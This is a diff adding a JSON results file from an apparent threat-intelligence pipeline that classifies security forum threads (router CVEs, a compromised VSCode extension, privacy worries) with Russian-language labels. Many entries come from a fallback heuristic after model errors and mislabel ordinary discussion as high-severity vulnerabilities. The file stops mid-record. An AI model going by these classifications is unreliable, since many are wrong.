@@ -1,0 +1,818 @@
+{
+  "generated_at": "2026-05-21T06:35:32.783572+00:00",
+  "model": "openai/gpt-oss-20b:free",
+  "threads_total": 15,
+  "results": [
+    {
+      "thread": {
+        "source_id": "reddit_netsec",
+        "source_label": "Reddit /r/netsec",
+        "source_type": "forum",
+        "language": "en",
+        "thread_title": "Score by collisions, patch by panic: defensive architecture for the post-90-day-disclosure era",
+        "thread_url": "https://www.reddit.com/r/netsec/comments/1tinwan/score_by_collisions_patch_by_panic_defensive/",
+        "author": "unknownhad",
+        "published_at": "2026-05-20T14:46:42+00:00",
+        "body": "After my last post on the death of the 90-day window ([https://blog.himanshuanand.com/2026/05/the-90-day-disclosure-policy-is-dead/](https://blog.himanshuanand.com/2026/05/the-90-day-disclosure-policy-is-dead/)), the loudest critique I got was: 'Great complaint, what's the proposal?' This is the proposal. It is an informal RFC on how we actually have to change engineering architecture when LLM-assisted bug hunting means the exploit lands before the patch. No magic vendor tools, just strict egress rules, ephemeral infrastructure (burning containers every 12 hours) and rootless runtime sandboxing. Curious to hear where you think this approach breaks down.",
+        "context_messages": [],
+        "metadata": {
+          "subreddit": "netsec",
+          "score": 4,
+          "num_comments": 0
+        }
+      },
+      "prefilter": {
+        "passed": true,
+        "matched_keywords": [
+          "0-day",
+          "exploit"
+        ],
+        "negative_hits": [],
+        "prefilter_score": 0.333
+      },
+      "status": "fallback",
+      "error": "Invalid JSON: {\n  \"is_relevant\": false,\n  \"signal_kind\": \"discussion\",\n  \"type\": \"news\",\n  \"russian_title\": \"Обсуждение архитектуры защиты от эксплойтов в эпоху LLM\",\n  \"russian_summary\": \"\",\n  \"russian_interpretat",
+      "normalized": {
+        "is_relevant": true,
+        "signal_kind": "vulnerability",
+        "type": "threat",
+        "russian_title": "Score by collisions, patch by panic: defensive architecture for the post-90-day-disclosure era",
+        "russian_summary": "В обсуждении выявлены признаки уязвимости или эксплуатации, включая технические индикаторы и/или CVE.",
+        "russian_interpretation": "Запись похожа на технический сигнал по уязвимости и требует приоритизации для дальнейшей проверки.",
+        "category": "Уязвимости и эксплуатация",
+        "severity": "high",
+        "vulnerability_type": "0-day",
+        "country": "Global",
+        "cve_mentions": [],
+        "vendor_candidates": [],
+        "product_candidates": [],
+        "evidence_tokens": [
+          "0-day",
+          "exploit"
+        ],
+        "confidence": 0.35,
+        "reasoning_ru": "Применена резервная эвристика из-за ошибки LLM: Invalid JSON: {\n  \"is_relevant\": false,\n  \"signal_kind\": \"discussion\",\n  \"type\": \"news\",\n  \"russian_title\": \"Обсуждение архитектуры защиты от эксплойтов в эпоху"
+      }
+    },
+    {
+      "thread": {
+        "source_id": "reddit_netsec",
+        "source_label": "Reddit /r/netsec",
+        "source_type": "forum",
+        "language": "en",
+        "thread_title": "CVE-2026-34472: Pre-auth credential exposure and auth bypass in ZTE H188A V6 routers",
+        "thread_url": "https://www.reddit.com/r/netsec/comments/1timb3b/cve202634472_preauth_credential_exposure_and_auth/",
+        "author": "TheReedemer69",
+        "published_at": "2026-05-20T13:49:55+00:00",
+        "body": "I published a technical analysis of CVE-2026-34472, a pre-authentication credential exposure and authentication bypass in the ZTE H188A V6 router. Root cause: a routing flaw allows unauthenticated access to logic intended for the pre-login setup wizard. The exposed flow returns sensitive configuration values, including WLAN and admin-related credentials, which can then be used to cross the authentication boundary. The writeup includes: * affected component analysis * decompiled firmware review * Lua/CGILua control-flow notes * disclosure timeline * PoC repository",
+        "context_messages": [
+          "Nice write-up. I keep my SSID hidden, WPS turned off, etc, it's not much but it's the best I can do. All these router exploits makes you wonder if it's intentional. Source: Worked at a major router manufacturer where the firmware team was offshored to China. Every exploit we found was downplayed by the offshore devs while onshore PMs kept pushing back to have it fixed. It was the weirdest thing."
+        ],
+        "metadata": {
+          "subreddit": "netsec",
+          "score": 3,
+          "num_comments": 1
+        }
+      },
+      "prefilter": {
+        "passed": true,
+        "matched_keywords": [
+          "auth bypass",
+          "bypass",
+          "credential",
+          "credentials",
+          "cve-",
+          "exploit",
+          "poc",
+          "rce"
+        ],
+        "negative_hits": [],
+        "prefilter_score": 1.0
+      },
+      "status": "fallback",
+      "error": "Invalid JSON: {\n  \"is_relevant\": true,\n  \"signal_kind\": \"vulnerability\",\n  \"type\": \"threat\",\n  \"russian_title\": \"CVE-2026-34472: Утечка учетных данных и обход аутентификации в маршрутизаторах ZTE H188A V6\",\n  \"russ",
+      "normalized": {
+        "is_relevant": true,
+        "signal_kind": "vulnerability",
+        "type": "threat",
+        "russian_title": "CVE-2026-34472: Pre-auth credential exposure and auth bypass in ZTE H188A V6 routers",
+        "russian_summary": "В обсуждении выявлены признаки уязвимости или эксплуатации, включая технические индикаторы и/или CVE.",
+        "russian_interpretation": "Запись похожа на технический сигнал по уязвимости и требует приоритизации для дальнейшей проверки.",
+        "category": "Уязвимости и эксплуатация",
+        "severity": "high",
+        "vulnerability_type": null,
+        "country": "Global",
+        "cve_mentions": [
+          "CVE-2026-34472"
+        ],
+        "vendor_candidates": [],
+        "product_candidates": [],
+        "evidence_tokens": [
+          "auth bypass",
+          "bypass",
+          "credential",
+          "credentials",
+          "cve-",
+          "exploit"
+        ],
+        "confidence": 0.35,
+        "reasoning_ru": "Применена резервная эвристика из-за ошибки LLM: Invalid JSON: {\n  \"is_relevant\": true,\n  \"signal_kind\": \"vulnerability\",\n  \"type\": \"threat\",\n  \"russian_title\": \"CVE-2026-34472: Утечка учетных данных и обход а"
+      }
+    },
+    {
+      "thread": {
+        "source_id": "reddit_netsec",
+        "source_label": "Reddit /r/netsec",
+        "source_type": "forum",
+        "language": "en",
+        "thread_title": "GitHub hit by a compromised VSCode extension",
+        "thread_url": "https://www.reddit.com/r/netsec/comments/1tiiyxq/github_hit_by_a_compromised_vscode_extension/",
+        "author": "acdha",
+        "published_at": "2026-05-20T11:35:33+00:00",
+        "body": "GitHub’s internal repositories were breached by a malicious VSCode extension: https://xcancel.com/github/status/2056949168208552080 Microsoft closed an earlier request for update cooldowns as not planned but hopefully they’ll reconsider that: https://github.com/microsoft/vscode/issues/272765 The current attempt: https://github.com/microsoft/vscode/issues/316867",
+        "context_messages": [
+          "There are so many shady extensions, I’d be really surprised if this was actually the first time a Microsoft employee got tricked…",
+          "VSCode extensions are basically privileged RCE with branding. The extension host runs arbitrary Node.js in-process with access to workspace FS, terminals, git context, network APIs, auth sessions, and whatever secrets the developer already has cached locally. Compromise the publisher/update path once and you inherit enterprise trust at scale. People focus too much on perimeter hardening while running dozens of auto-updating third-party extensions with implicit code execution rights. Supply chain attacks win because the malicious code arrives through an already-whitelisted execution path.",
+          "i remember running into similar supply chain issues back at my old job. its wild how much trust we put into these extensions without really auditing the code first. hopefully they actually implement those cooldowns this time cuz it feels like a major oversight"
+        ],
+        "metadata": {
+          "subreddit": "netsec",
+          "score": 113,
+          "num_comments": 16
+        }
+      },
+      "prefilter": {
+        "passed": true,
+        "matched_keywords": [
+          "breach",
+          "rce"
+        ],
+        "negative_hits": [],
+        "prefilter_score": 0.333
+      },
+      "status": "analyzed",
+      "normalized": {
+        "is_relevant": true,
+        "signal_kind": "threat",
+        "type": "threat",
+        "russian_title": "GitHub взломан через скомпрометированный расширение VSCode",
+        "russian_summary": "Внутренние репозитории GitHub были скомпрометированы благодаря вредоносному расширению VSCode, которое получило доступ к рабочему пространству, терминалам, git‑контексту и сетевым API. Это пример атаки на цепочку поставок, где злоумышленник использует доверенный путь обновления расширений.",
+        "russian_interpretation": "Аналитик должен обратить внимание на уязвимость в процессе обновления расширений VSCode, которая позволяет выполнять произвольный код с правами разработчика. Это повышает риск для всех организаций, использующих VSCode, и требует пересмотра политики доверия к сторонним расширениям.",
+        "category": "Атаки на цепочку поставок",
+        "severity": "high",
+        "vulnerability_type": null,
+        "country": "Global",
+        "cve_mentions": [],
+        "vendor_candidates": [
+          "Microsoft",
+          "GitHub"
+        ],
+        "product_candidates": [
+          "VSCode",
+          "GitHub"
+        ],
+        "evidence_tokens": [
+          "компрометированное расширение VSCode",
+          "RCE",
+          "внутренние репозитории GitHub"
+        ],
+        "confidence": 0.9,
+        "reasoning_ru": "Текст явно описывает успешный взлом через вредоносное расширение VSCode, что является конкретным инцидентом угрозы и уязвимости в цепочке поставок. Поэтому сообщение релевантно и классифицируется как threat с высоким уровнем серьезности."
+      }
+    },
+    {
+      "thread": {
+        "source_id": "reddit_netsec",
+        "source_label": "Reddit /r/netsec",
+        "source_type": "forum",
+        "language": "en",
+        "thread_title": "How Storm-2949 turned a compromised identity into a cloud-wide breach",
+        "thread_url": "https://www.reddit.com/r/netsec/comments/1thpjfa/how_storm2949_turned_a_compromised_identity_into/",
+        "author": "thewhippersnapper4",
+        "published_at": "2026-05-19T14:59:37+00:00",
+        "body": "",
+        "context_messages": [
+          "This report highlights the critical importance of robust identity and access management (IAM) controls, especially in cloud environments. The lateral movement capabilities demonstrated by Storm-2949 underscore the need for granular permissions and continuous monitoring of privileged accounts. Implementing zero-trust principles, where every access request is verified regardless of origin, can significantly mitigate such risks. Additionally, strong authentication mechanisms like FIDO2-compliant MFA are essential to prevent initial identity compromise. Regular audits of cloud configurations and IAM policies are crucial to identify and remediate potential attack paths."
+        ],
+        "metadata": {
+          "subreddit": "netsec",
+          "score": 7,
+          "num_comments": 1
+        }
+      },
+      "prefilter": {
+        "passed": true,
+        "matched_keywords": [
+          "breach"
+        ],
+        "negative_hits": [],
+        "prefilter_score": 0.167
+      },
+      "status": "fallback",
+      "error": "429 Client Error: Too Many Requests for url: https://openrouter.ai/api/v1/chat/completions",
+      "normalized": {
+        "is_relevant": true,
+        "signal_kind": "incident",
+        "type": "threat",
+        "russian_title": "How Storm-2949 turned a compromised identity into a cloud-wide breach",
+        "russian_summary": "В обсуждении есть признаки инцидента или утечки данных.",
+        "russian_interpretation": "Запись похожа на инцидентный сигнал и может быть полезна для дальнейшего ручного разбора.",
+        "category": "Утечки данных",
+        "severity": "medium",
+        "vulnerability_type": null,
+        "country": "Global",
+        "cve_mentions": [],
+        "vendor_candidates": [],
+        "product_candidates": [],
+        "evidence_tokens": [
+          "breach"
+        ],
+        "confidence": 0.45,
+        "reasoning_ru": "Применена резервная эвристика из-за ошибки LLM: 429 Client Error: Too Many Requests for url: https://openrouter.ai/api/v1/chat/completions"
+      }
+    },
+    {
+      "thread": {
+        "source_id": "reddit_netsec",
+        "source_label": "Reddit /r/netsec",
+        "source_type": "forum",
+        "language": "en",
+        "thread_title": "CVE-2026-34473: Pre-auth ZTE H-series router DoS via CGILua request-body parsing",
+        "thread_url": "https://www.reddit.com/r/netsec/comments/1thjmen/cve202634473_preauth_zte_hseries_router_dos_via/",
+        "author": "TheReedemer69",
+        "published_at": "2026-05-19T11:08:50+00:00",
+        "body": "Disclosure: this is my own research/writeup. I reported this ZTE H-series router DoS in 2024; it is now public as `CVE-2026-34473`. The writeup focuses on the root cause rather than just the symptom. The issue is not simply “large POST body kills the UI.” Firmware analysis maps the behavior to CGILua request-body parsing: attacker-controlled `application/x-www-form-urlencoded` POST data reaches body handling before login enforcement matters. The article includes validation footage, affected-model context, disclosure timeline, decompiled parser evidence, and reconstructed public-safe code-path notes. Interested in feedback on the root-cause framing from people who review embedded web stacks or router firmware. open for collabs too.",
+        "context_messages": [],
+        "metadata": {
+          "subreddit": "netsec",
+          "score": 7,
+          "num_comments": 0
+        }
+      },
+      "prefilter": {
+        "passed": true,
+        "matched_keywords": [
+          "cve-",
+          "rce"
+        ],
+        "negative_hits": [],
+        "prefilter_score": 0.333
+      },
+      "status": "analyzed",
+      "normalized": {
+        "is_relevant": true,
+        "signal_kind": "vulnerability",
+        "type": "news",
+        "russian_title": "CVE-2026-34473: DoS на роутерах ZTE H‑series из-за ошибки в CGILua",
+        "russian_summary": "Обнаружена уязвимость, позволяющая злоумышленнику без аутентификации отправлять POST‑запросы с большим телом, что приводит к отказу в работе веб‑интерфейса роутера. Ошибка в парсере CGILua обрабатывает данные до проверки логина.",
+        "russian_interpretation": "Уязвимость может использоваться для DoS‑атак на целевые сети, особенно в средах, где роутеры ZTE H‑series широко применяются. Требуется немедленное обновление прошивки и мониторинг трафика на подобные запросы.",
+        "category": "Уязвимости и эксплуатация",
+        "severity": "high",
+        "vulnerability_type": null,
+        "country": "Global",
+        "cve_mentions": [
+          "CVE-2026-34473"
+        ],
+        "vendor_candidates": [
+          "ZTE"
+        ],
+        "product_candidates": [
+          "H-series router"
+        ],
+        "evidence_tokens": [
+          "DoS",
+          "CGILua",
+          "CVE-2026-34473"
+        ],
+        "confidence": 0.95,
+        "reasoning_ru": "В тексте явно упоминается CVE-2026-34473, описывается конкретная уязвимость, способная вызвать DoS, и указаны детали реализации. Это соответствует критериям релевантного сигнала угрозы."
+      }
+    },
+    {
+      "thread": {
+        "source_id": "reddit_cybersecurity",
+        "source_label": "Reddit /r/cybersecurity",
+        "source_type": "forum",
+        "language": "en",
+        "thread_title": "Cybercrime service disrupted for abusing Microsoft platform to sign malware",
+        "thread_url": "https://www.reddit.com/r/cybersecurity/comments/1tixfal/cybercrime_service_disrupted_for_abusing/",
+        "author": "Steap-Edit",
+        "published_at": "2026-05-20T20:11:07+00:00",
+        "body": "",
+        "context_messages": [],
+        "metadata": {
+          "subreddit": "cybersecurity",
+          "score": 14,
+          "num_comments": 0
+        }
+      },
+      "prefilter": {
+        "passed": true,
+        "matched_keywords": [
+          "malware"
+        ],
+        "negative_hits": [],
+        "prefilter_score": 0.167
+      },
+      "status": "fallback",
+      "error": "429 Client Error: Too Many Requests for url: https://openrouter.ai/api/v1/chat/completions",
+      "normalized": {
+        "is_relevant": true,
+        "signal_kind": "threat",
+        "type": "threat",
+        "russian_title": "Cybercrime service disrupted for abusing Microsoft platform to sign malware",
+        "russian_summary": "В обсуждении присутствуют признаки вредоносной активности или мошеннической схемы.",
+        "russian_interpretation": "Запись может быть полезна как индикативный threat-сигнал, но требует уточнения аналитиком.",
+        "category": "Вредоносное ПО",
+        "severity": "medium",
+        "vulnerability_type": null,
+        "country": "Global",
+        "cve_mentions": [],
+        "vendor_candidates": [],
+        "product_candidates": [],
+        "evidence_tokens": [
+          "malware"
+        ],
+        "confidence": 0.45,
+        "reasoning_ru": "Применена резервная эвристика из-за ошибки LLM: 429 Client Error: Too Many Requests for url: https://openrouter.ai/api/v1/chat/completions"
+      }
+    },
+    {
+      "thread": {
+        "source_id": "reddit_cybersecurity",
+        "source_label": "Reddit /r/cybersecurity",
+        "source_type": "forum",
+        "language": "en",
+        "thread_title": "Is there no more privacy left in the world?",
+        "thread_url": "https://www.reddit.com/r/cybersecurity/comments/1tiuvkn/is_there_no_more_privacy_left_in_the_world/",
+        "author": "NonstickFryingPans",
+        "published_at": "2026-05-20T18:44:15+00:00",
+        "body": "Seeing flock cameras everywhere and having apps that are able to track your every move whilst you are consistently being tracked online for your political beliefs and what you're interested in and then there are door cameras that can detect your face and cross reference it with all the previously mentioned, I feel as if I cannot hide myself anymore. This is especially concerning due to the number of data breaches that keep happening, and no company is held accountable for said breaches. Like, I will wake up and see Malwarebytes give me a notification about a data breach, and nothing will even happen to get any justice. There's also the concern of people search services where ordinary people (not megacorporations) can use OSINT software to track you using usernames, then easily recover your information using said information you may have leaked online that can lead to doxxing. Also, with the way the political climate is right now and seeing people get prosecuted for the things they say online, it feels like free speech is just dead. Like I want to live a private life away from these corporations, but I don't want to boot up TOR browser every day with a VPN, then every website I visit blocks me because of my private browsing practices (also not mentioning that these private browsers are EXTREMELY SLOW, making the web surfing experience horrendous).",
+        "context_messages": [
+          "Using a vpn to browse the internet is increasingly cumbersome. Plenty of websites straight up refuse to let you in, and the ones that do often make you confirm you're human every time.",
+          "Don't forget all car manufacturers are required to include AI facial monitoring systems to ensure that you are a perky happy driver. [Federal Surveillance Tech Becomes Mandatory in New Cars by 2027 : r/cars](https://www.reddit.com/r/cars/comments/1su38u6/federal_surveillance_tech_becomes_mandatory_in/) I'm seriously spooked. I was pulling camping gear out of storage and some of it was in a bag from an old Lovesack bean bag. Like from 10-15 years ago. I didn't say anything out loud. My phone was on the counter across the room. I just read over the sassy advertising on the bag and moved on. This morning I get an advert for Lovesack in my feed. Fuck this panopticon.",
+          "For those suggesting VPNs, yeah they're not bad to have, but they're beginning to become useless these days. Websites can easily detect VPN usage and block you, or force you to turn off your VPN by \"breaking\" the site while it's still on. Also VPNs don't do anything against browser fingerprinting. That's how most online platforms map your behavior."
+        ],
+        "metadata": {
+          "subreddit": "cybersecurity",
+          "score": 72,
+          "num_comments": 46
+        }
+      },
+      "prefilter": {
+        "passed": true,
+        "matched_keywords": [
+          "breach",
+          "malware",
+          "rce"
+        ],
+        "negative_hits": [],
+        "prefilter_score": 0.5
+      },
+      "status": "fallback",
+      "error": "Invalid JSON: ",
+      "normalized": {
+        "is_relevant": true,
+        "signal_kind": "vulnerability",
+        "type": "threat",
+        "russian_title": "Is there no more privacy left in the world?",
+        "russian_summary": "В обсуждении выявлены признаки уязвимости или эксплуатации, включая технические индикаторы и/или CVE.",
+        "russian_interpretation": "Запись похожа на технический сигнал по уязвимости и требует приоритизации для дальнейшей проверки.",
+        "category": "Уязвимости и эксплуатация",
+        "severity": "high",
+        "vulnerability_type": null,
+        "country": "Global",
+        "cve_mentions": [],
+        "vendor_candidates": [],
+        "product_candidates": [],
+        "evidence_tokens": [
+          "breach",
+          "malware",
+          "rce"
+        ],
+        "confidence": 0.35,
+        "reasoning_ru": "Применена резервная эвристика из-за ошибки LLM: Invalid JSON:"
+      }
+    },
+    {
+      "thread": {
+        "source_id": "reddit_cybersecurity",
+        "source_label": "Reddit /r/cybersecurity",
+        "source_type": "forum",
+        "language": "en",
+        "thread_title": "GitHub breach highlights developer tools as part of attack surface",
+        "thread_url": "https://www.reddit.com/r/cybersecurity/comments/1tiqjhn/github_breach_highlights_developer_tools_as_part/",
+        "author": "steadwing_official",
+        "published_at": "2026-05-20T16:17:46+00:00",
+        "body": "The recent GitHub incident + reports of a compromised VSCode extension feel like a wake up call for modern engineering teams. A trusted extension already has repository access, local context, and developer trust. “That makes it a very different security problem than traditional infra attacks.” Teams now need to treat developer environments, extensions, Github Apps, and local tooling with the same weight as production infrastructure. What are other teams going to do after this I wonder.",
+        "context_messages": [
+          "Adversaries are just going to keep climbing up the stack to wherever the security is weakest. And, the big issue is, when these problems occur, we don't evaluate the entire stack and address security holistically. We just fix the one place where the breaches occur most, until they stop occurring there and start showing up at a different place. * Get a door * Close the door * Put a lock on the door * Reinforce the door * Put a more resistant lock on the door * Close the windows * Lock the windows * ... Too few are looking at the security of the house holistically, or considering security when adding new tools, ornaments or other features to the house over time."
+        ],
+        "metadata": {
+          "subreddit": "cybersecurity",
+          "score": 5,
+          "num_comments": 1
+        }
+      },
+      "prefilter": {
+        "passed": true,
+        "matched_keywords": [
+          "breach",
+          "rce"
+        ],
+        "negative_hits": [],
+        "prefilter_score": 0.333
+      },
+      "status": "fallback",
+      "error": "429 Client Error: Too Many Requests for url: https://openrouter.ai/api/v1/chat/completions",
+      "normalized": {
+        "is_relevant": true,
+        "signal_kind": "vulnerability",
+        "type": "threat",
+        "russian_title": "GitHub breach highlights developer tools as part of attack surface",
+        "russian_summary": "В обсуждении выявлены признаки уязвимости или эксплуатации, включая технические индикаторы и/или CVE.",
+        "russian_interpretation": "Запись похожа на технический сигнал по уязвимости и требует приоритизации для дальнейшей проверки.",
+        "category": "Уязвимости и эксплуатация",
+        "severity": "high",
+        "vulnerability_type": null,
+        "country": "Global",
+        "cve_mentions": [],
+        "vendor_candidates": [],
+        "product_candidates": [],
+        "evidence_tokens": [
+          "breach",
+          "rce"
+        ],
+        "confidence": 0.45,
+        "reasoning_ru": "Применена резервная эвристика из-за ошибки LLM: 429 Client Error: Too Many Requests for url: https://openrouter.ai/api/v1/chat/completions"
+      }
+    },
+    {
+      "thread": {
+        "source_id": "reddit_cybersecurity",
+        "source_label": "Reddit /r/cybersecurity",
+        "source_type": "forum",
+        "language": "en",
+        "thread_title": "Why do some malware use unique user-agent strings?",
+        "thread_url": "https://www.reddit.com/r/cybersecurity/comments/1tiq5tt/why_do_some_malware_use_unique_useragent_strings/",
+        "author": "Excellent-Carpet-938",
+        "published_at": "2026-05-20T16:05:00+00:00",
+        "body": "Looking at libredtail-http for example, it seems that user-agent spoofing is trivial. So why would the client just come out and tell me that’s what it is? I’ll grant that the request pattern is obvious regardless, but it seems like the malware is just labeling itself for me.",
+        "context_messages": [
+          "User-Agent might be their dumb roundabout way of restricting access to web payload delivery or C2",
+          "I think it's because a blank/empty User-Agent field in an HTTP header has been a signature of malicious activity for so long that it's checked by CGI on systems where the firewall can't drill down through IP/TCP/HTTP protocols to block it there. If everybody in a ski mask is arrested on sight, then I'm obviously going to put on a Ronald Reagan mask. Pretty soon it will be widely known that the Ronald Reagan mask is me, personally, and I'm no better than anybody in a ski mask, but it will still take awhile for the majority of police to start arresting everybody in a Ronald Reagan mask.",
+          "Some code libraries (npm somethingsomething ehh maybe non axioms) don’t by default even set a user agent so they then have to put something and it’s probably too much work to ask what is real"
+        ],
+        "metadata": {
+          "subreddit": "cybersecurity",
+          "score": 20,
+          "num_comments": 10
+        }
+      },
+      "prefilter": {
+        "passed": true,
+        "matched_keywords": [
+          "malware"
+        ],
+        "negative_hits": [],
+        "prefilter_score": 0.167
+      },
+      "status": "analyzed",
+      "normalized": {
+        "is_relevant": false,
+        "signal_kind": "other",
+        "type": "news",
+        "russian_title": null,
+        "russian_summary": null,
+        "russian_interpretation": null,
+        "category": null,
+        "severity": null,
+        "vulnerability_type": null,
+        "country": null,
+        "cve_mentions": [],
+        "vendor_candidates": [],
+        "product_candidates": [],
+        "evidence_tokens": [],
+        "confidence": 0.0,
+        "reasoning_ru": "Текст представляет собой общую дискуссию о практиках вредоносного ПО, без конкретных указаний на уязвимость, эксплуатацию, инцидент или утечку. Поэтому сигнал не считается релевантным."
+      }
+    },
+    {
+      "thread": {
+        "source_id": "reddit_cybersecurity",
+        "source_label": "Reddit /r/cybersecurity",
+        "source_type": "forum",
+        "language": "en",
+        "thread_title": "Encrypted emails bypassing email security tool",
+        "thread_url": "https://www.reddit.com/r/cybersecurity/comments/1tipzvy/encrypted_emails_bypassing_email_security_tool/",
+        "author": "Working_Train2858",
+        "published_at": "2026-05-20T15:59:34+00:00",
+        "body": "What are y'all doing for encrypted email phishing protection? We have a ton of legitimate encrypted emails going in and out of our company. Our email tool cannot scan inside the encrypted emails, leaving a huge gap in our phishing protection. Lately, the bad actors have been sending mostly encrypted phishing emails from legitimate sources and we are having a hard time stopping or evaluating these.",
+        "context_messages": [
+          "Cybersecurity training. Phishing is a social engineering attack, not a technical attack.",
+          "Security Awareness Training URL Defense Protection SPF, DKIM, and DMARC inbound anti spoofing protection Inbound spoofing protection Inbound DNS checking All these features are pretty much available with almost all email filtering services from Microsoft Defender, Minecast, Proofpoint, Barracuda, etc. You just have to buy the advanced packages and actually configure the settings. However what's probably the most important protection is a Trusted Device Complaint Requirement Conditional Access Policy and enforcing phishing Resistant MFA (passkeys only), considering most of those encrypted phishing emails are likely the MFA hijacking ones. Also ensure you have endpoint protection, EDR and devices local admin rights are locked down on all devices. The whole layered approach is genuinely needed. There's no 1 solution fits all to protect against malicious encrypted emails and MFA evilginx session hijacking. You do need a layered approach.",
+          "Are you sure you actually can’t decrypt/inspect them? “Encrypted email” can mean many different things. If we’re talking about standard TLS between mail servers, most enterprise email security platforms can still inspect the content at some stage of the flow.",
+          "Mimecast? Unless you mean emails going out are encrypted? Then DLP software? It's Wednesday and I want to go home."
+        ],
+        "metadata": {
+          "subreddit": "cybersecurity",
+          "score": 9,
+          "num_comments": 20
+        }
+      },
+      "prefilter": {
+        "passed": false,
+        "matched_keywords": [
+          "bypass",
+          "edr",
+          "phishing",
+          "rce"
+        ],
+        "negative_hits": [
+          "training"
+        ],
+        "prefilter_score": 0.667
+      },
+      "status": "skipped_by_prefilter"
+    },
+    {
+      "thread": {
+        "source_id": "stackexchange_security",
+        "source_label": "Information Security Stack Exchange",
+        "source_type": "forum",
+        "language": "en",
+        "thread_title": "how to check usages of a class method in open source code",
+        "thread_url": "https://security.stackexchange.com/questions/279220/how-to-check-usages-of-a-class-method-in-open-source-code",
+        "author": "anonymous",
+        "published_at": "2024-10-21T14:51:19+00:00",
+        "body": "I detected in a codeline usage of a bouncy castle that is vulnerable to the cve CVE-2023-33201. The CVE seems to come from the guilty class X509LDAPCertStoreSpi.java , and in specific the method search() . In the codeline I am testing, there is no direct usage of this class or method. Now I want to see if the method X509LDAPCertStoreSpi.search() is used somewhere inside the bouncy castle to see if it is indirectly called. Any idea how to achieve this? and is this the right way to analyze exploitability?",
+        "context_messages": [],
+        "metadata": {
+          "site": "security.stackexchange",
+          "tags": [
+            "vulnerability",
+            "cve",
+            "opensource"
+          ],
+          "score": 0,
+          "answer_count": 1,
+          "is_answered": false
+        }
+      },
+      "prefilter": {
+        "passed": true,
+        "matched_keywords": [
+          "cve-",
+          "exploit",
+          "rce"
+        ],
+        "negative_hits": [],
+        "prefilter_score": 0.5
+      },
+      "status": "fallback",
+      "error": "Invalid JSON: ",
+      "normalized": {
+        "is_relevant": true,
+        "signal_kind": "vulnerability",
+        "type": "threat",
+        "russian_title": "how to check usages of a class method in open source code",
+        "russian_summary": "В обсуждении выявлены признаки уязвимости или эксплуатации, включая технические индикаторы и/или CVE.",
+        "russian_interpretation": "Запись похожа на технический сигнал по уязвимости и требует приоритизации для дальнейшей проверки.",
+        "category": "Уязвимости и эксплуатация",
+        "severity": "high",
+        "vulnerability_type": null,
+        "country": "Global",
+        "cve_mentions": [
+          "CVE-2023-33201"
+        ],
+        "vendor_candidates": [],
+        "product_candidates": [],
+        "evidence_tokens": [
+          "cve-",
+          "exploit",
+          "rce"
+        ],
+        "confidence": 0.35,
+        "reasoning_ru": "Применена резервная эвристика из-за ошибки LLM: Invalid JSON:"
+      }
+    },
+    {
+      "thread": {
+        "source_id": "stackexchange_security",
+        "source_label": "Information Security Stack Exchange",
+        "source_type": "forum",
+        "language": "en",
+        "thread_title": "How should a small security team prioritize CVEs when CVSS scores don't reflect real-world exploitability?",
+        "thread_url": "https://security.stackexchange.com/questions/286827/how-should-a-small-security-team-prioritize-cves-when-cvss-scores-dont-reflect",
+        "author": "defend.network",
+        "published_at": "2026-03-27T20:13:10+00:00",
+        "body": "We're a 3-person IT security team managing ~200 servers and endpoints. Our vulnerability scanner generates hundreds of findings per month. We currently prioritize by CVSS score, but we're finding this leads to poor outcomes: High CVSS vulnerabilities that have no known exploit in the wild consume our patching resources Medium CVSS vulnerabilities that are actively exploited (per CISA KEV) get delayed because they're \"medium\" We don't have budget for commercial threat intelligence to supplement CVSS with exploit probability data What free or low-cost methods exist to prioritize CVEs based on actual exploitability rather than theoretical CVSS severity? Specifically interested in: How to operationalize CISA KEV catalog into our patching workflow Whether EPSS (Exploit Prediction Scoring System) is mature enough to rely on How other small teams handle the gap between CVSS severity and real-world risk Any structured frameworks for risk-based vulnerability prioritization without commercial tools",
+        "context_messages": [],
+        "metadata": {
+          "site": "security.stackexchange",
+          "tags": [
+            "risk",
+            "cvss",
+            "vulnerability-management"
+          ],
+          "score": 0,
+          "answer_count": 0,
+          "is_answered": false
+        }
+      },
+      "prefilter": {
+        "passed": true,
+        "matched_keywords": [
+          "exploit",
+          "exploited",
+          "in the wild",
+          "rce",
+          "vulnerability"
+        ],
+        "negative_hits": [],
+        "prefilter_score": 0.833
+      },
+      "status": "analyzed",
+      "normalized": {
+        "is_relevant": false,
+        "signal_kind": "other",
+        "type": "news",
+        "russian_title": null,
+        "russian_summary": null,
+        "russian_interpretation": null,
+        "category": null,
+        "severity": null,
+        "vulnerability_type": null,
+        "country": null,
+        "cve_mentions": [],
+        "vendor_candidates": [],
+        "product_candidates": [],
+        "evidence_tokens": [],
+        "confidence": 0.0,
+        "reasoning_ru": "Обсуждение общих методов приоритизации CVE, без конкретных уязвимостей, эксплойтов или инцидентов. Поэтому сигнал не релевантен."
+      }
+    },
+    {
+      "thread": {
+        "source_id": "stackexchange_security",
+        "source_label": "Information Security Stack Exchange",
+        "source_type": "forum",
+        "language": "en",
+        "thread_title": "web app 3rd party JS dependency vulnerability management",
+        "thread_url": "https://security.stackexchange.com/questions/245529/web-app-3rd-party-js-dependency-vulnerability-management",
+        "author": "displayme",
+        "published_at": "2021-03-01T10:42:26+00:00",
+        "body": "As a security engineer, I wonder about the common approach for web app 3rd party JS dependency vulnerability management. We have a lot of apps depend on Jquery etc. In a regular vulnerability scan, old versions of JS libraries (which alot of them has XSS CVEs) reported as vulnerability. Without really reading and understanding the code, you can't say your app is affected by those XSS's or not and it is not an easy job for a security engineer. However, upgrading with newer version (which hopefully no assigned XSS CVE s) is not easy too because it requires effort for new developments and QA-UX tests on the app by other teams. I believe it is common problem. So what is the industry standart (applied by big players like Google, Apple, microsoft etc.). We have cases that we classify the issue as vulnerability, without providing an actual XSS exploit. However development teams are not happy to upgrade it because of the effort. They suggest fixes by editing the library. So what to do when you encounter an old JS library that has known vulnerabilities? To Force the upgrade despite to development and test effort? To fix the old version on your side by looking at the changes over source code? (guess it is the worst idea) Totally ignoring it until an XSS exploit has been found for that specific app? (finding the real exploit is not easy because the need of really examine where the vulnerable part is and find out if you are using it or not. pretty time consuming for dynamic testers and it is completely manuel) Classifying them as a risk instead of vulnerability other ideas?",
+        "context_messages": [],
+        "metadata": {
+          "site": "security.stackexchange",
+          "tags": [
+            "xss",
+            "appsec",
+            "vulnerability",
+            "web"
+          ],
+          "score": 2,
+          "answer_count": 1,
+          "is_answered": false
+        }
+      },
+      "prefilter": {
+        "passed": true,
+        "matched_keywords": [
+          "exploit",
+          "rce",
+          "vulnerability",
+          "xss"
+        ],
+        "negative_hits": [],
+        "prefilter_score": 0.667
